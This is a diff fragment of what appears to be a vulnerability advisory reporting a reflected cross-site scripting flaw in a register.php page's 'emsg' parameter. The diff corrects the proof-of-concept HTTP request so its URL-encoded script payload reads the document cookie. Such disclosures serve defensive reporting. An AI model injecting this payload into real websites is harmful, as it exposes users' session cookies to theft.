@@ -10,7 +10,7 @@ Is possible to inject javascript code and prompt document cookie.
 ## vulnerability 
 
 ```
-GET /mw/register.php?emsg=%3Cscript%3Ealert(Document.cookie)%3C/script%3E HTTP/2
+GET /mw/register.php?emsg=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/2
 Host: vulnhost.com
 Cookie: PHPSESSID=tttbitb72h0efdddda4ft9q8e2f
 Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
